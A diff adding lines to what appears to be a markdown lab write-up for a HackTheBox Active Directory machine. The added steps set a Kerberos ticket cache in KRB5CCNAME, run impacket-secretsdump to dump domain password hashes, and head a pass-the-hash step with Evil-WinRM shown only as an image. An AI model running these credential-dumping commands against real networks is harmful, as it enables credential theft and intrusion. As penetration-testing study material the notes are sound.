@@ -62,6 +62,26 @@ KRB5CCNAME=[ccache file name [endswith .ccache] impacket-psexec [domain]/[user]@
 
 ![image](https://github.com/user-attachments/assets/68bf410e-228d-4ade-9698-4afec915d1fb)
 
+- Dumping the hashes with impacket-secretsdump-:
+ - You can set the `KRB5CCNAME` as an environmental variable
+   ```bash
+   export KRB5CCNAME=$(pwd)/administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+   ```
+  
+- Syntax-:
+
+```bash
+impacket-secretsdump -k -target-ip [ip] [domain name]
+```
+![image](https://github.com/user-attachments/assets/bed765e7-218d-4e65-9afc-e0f156620534)
+
+- Pass the hash with Evil-winrm -:
+
+![image](https://github.com/user-attachments/assets/0f8af80b-c32a-4782-a63d-0f76e1e93cf7)
+
+------------------------
+
+
 
 
 
